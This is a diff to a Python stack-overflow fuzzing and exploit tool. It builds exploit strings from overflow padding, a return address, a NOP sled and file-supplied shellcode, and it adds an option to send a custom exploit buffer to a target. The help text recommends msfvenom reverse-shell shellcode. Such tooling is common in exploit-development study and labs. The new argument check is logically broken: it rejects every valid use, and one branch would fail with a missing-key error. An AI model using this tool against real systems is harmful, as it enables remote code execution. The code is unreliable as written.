@@ -171,7 +171,7 @@ class FuzzLib(object):
 	def test_return_address(b_location, return_address, **kwargs):
 		first_stager = "C" * 390
 
-		if(kwargs['cust_stager'] != None):
+		if (kwargs['cust_stager'] != None):
 			first_stager = kwargs['cust_stager']
 
 		string_buffer = "A" * b_location + return_address + first_stager
@@ -179,14 +179,26 @@ class FuzzLib(object):
 		return str(string_buffer).decode('string-escape')
 
 	@staticmethod
-	def generate_exploit_string(b_location, return_address, shellcode):
+	def generate_exploit_string(b_location, return_address, **kwargs):
+		string_buffer = ""
 		clean_shellcode = ""
-		with open(shellcode) as f:
-			for line in f:
-				clean_line = re.sub('[";]', '', line).strip()
-				clean_shellcode += clean_line
+		clean_custom_buffer = ""
 
-		string_buffer = "A" * b_location + return_address + "\x90" * 8 + clean_shellcode 
+		if (kwargs['shellcode'] != None):
+			with open(kwargs['shellcode']) as f:
+				for line in f:
+					clean_line = re.sub('[";]', '', line).strip()
+					clean_shellcode += clean_line
+
+			string_buffer = "A" * b_location + return_address + "\x90" * 8 + clean_shellcode
+
+		elif (kwargs['custom_exploit_buffer'] != None):
+			with open(kwargs['custom_exploit_buffer']) as f:
+				for line in f:
+					clean_line = re.sub('[";]', '', line).strip()
+					clean_custom_buffer += clean_line
+
+			string_buffer = clean_custom_buffer
 
 		return str(string_buffer).decode('string-escape')
 
@@ -322,6 +334,10 @@ def main():
 	parser.add_argument('-x', dest='shellcode', type=check_file_exists, 
 			metavar='<shellcode file>', help='''file containing shellcode string to use. Use a tool 
 			like msfvenom to automate the creation of reverse shell shellcode.''')
+	parser.add_argument('--custom-exploit-buffer', dest='custom_exploit_buffer', type=check_file_exists, 
+			metavar='<custom buffer file>', help='''file containing a custom exploit buffer string. This 
+			string should include all shellcode, stager code, return address & any padding in hexidecimal 
+			format. This option is only used with --send-exploit.''')
 
 	args = parser.parse_args()
 	fuzz_l = FuzzLib()
@@ -415,12 +431,24 @@ def main():
 				send_buffer(conn, args.buffer_to_fuzz, result)		
 
 		elif args.send_exploit:
-			if args.single_buff_location == 0 or args.return_address == 'None' or args.shellcode == 'None':
+			if args.single_buff_location == 0 or args.return_address == 'None':
 				char_invalid_msg = '''Both the -l, -a and -x arguments must be used. Use --help for usage information'''
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
 			else:
-				result = fuzz_l.generate_exploit_string(args.single_buff_location, args.return_address, args.shellcode)
+				result = ""
+				if (args.shellcode == None or args.custom_exploit_buffer == None) or (args.shellcode != None and args.custom_exploit_buffer != None):
+					char_invalid_msg = '''Must use -x OR --custom-exploit-buffer. --help for usage information'''
+					raise argparse.ArgumentTypeError(char_invalid_msg)
+					return False
+				else:
+					if args.shellcode != None:
+						result = fuzz_l.generate_exploit_string(args.single_buff_location, 
+									args.return_address, shellcode=args.shellcode)
+					else:
+						result = fuzz_l.generate_exploit_string(args.single_buff_location, 
+									args.return_address, custom_exploit_buffer=args.custom_exploit_buffer)
+
 				send_buffer(conn, args.buffer_to_fuzz, result)
 
 if __name__ == "__main__":
